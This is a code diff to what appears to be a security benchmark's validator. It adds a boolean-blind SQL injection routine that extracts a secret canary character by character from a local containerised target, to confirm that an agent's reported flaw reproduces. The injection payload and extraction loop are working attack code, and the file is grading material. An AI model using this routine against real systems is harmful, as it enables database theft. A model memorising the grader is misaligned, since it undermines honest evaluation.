@@ -106,14 +106,59 @@ def run_replay(
         if run.returncode != 0:
             return False
         time.sleep(2)  # let the target bind its port
-        return execute_reproduction(
-            f"http://127.0.0.1:{port}", steps, replay_challenge.canary
-        )
+        base = f"http://127.0.0.1:{port}"
+
+        if challenge.variant == "boolean":
+            # A blind variant leaks nothing in any single response, so replaying
+            # one request can't recover the canary. Instead the validator itself
+            # re-extracts it via boolean blind on the fresh target and checks it
+            # matches -- confirming the reported endpoint is genuinely injectable
+            # and the vulnerability reproduces. No agent code runs.
+            extracted = _boolean_extract(
+                base, replay_challenge.vulnerable_endpoint,
+                replay_challenge.vulnerable_parameter,
+                replay_challenge.secret_table, replay_challenge.secret_column,
+            )
+            return extracted == replay_challenge.canary
+
+        return execute_reproduction(base, steps, replay_challenge.canary)
     except Exception:
         return False
     finally:
         subprocess.run(["docker", "rm", "--force", "--volumes", name],
                        capture_output=True, timeout=C.DOCKER_CLI_TIMEOUT_S)
+
+
+_HEX = "0123456789abcdef"
+
+
+def _boolean_extract(base_url, endpoint, param, table, column, *, length=32, timeout=5.0) -> str:
+    """Validator-side boolean-blind extraction of the secret, using the known
+    schema. Reconstructs the canary char by char from true/false answers."""
+    base_url = base_url.rstrip("/")
+
+    def btest(condition: str) -> bool:
+        payload = f"zzz' OR ({condition})-- -"
+        url = f"{base_url}{endpoint}?" + urllib.parse.urlencode({param: payload})
+        try:
+            body = urllib.request.urlopen(url, timeout=timeout).read()
+            import json
+            return bool(json.loads(body).get("found"))
+        except Exception:
+            return False
+
+    subquery = f'SELECT "{column}" FROM "{table}" LIMIT 1'
+    out = ""
+    for i in range(1, length + 1):
+        ch = None
+        for c in _HEX:
+            if btest(f"substr(({subquery}),{i},1)='{c}'"):
+                ch = c
+                break
+        if ch is None:
+            break
+        out += ch
+    return out
 
 
 def _free_port() -> int:
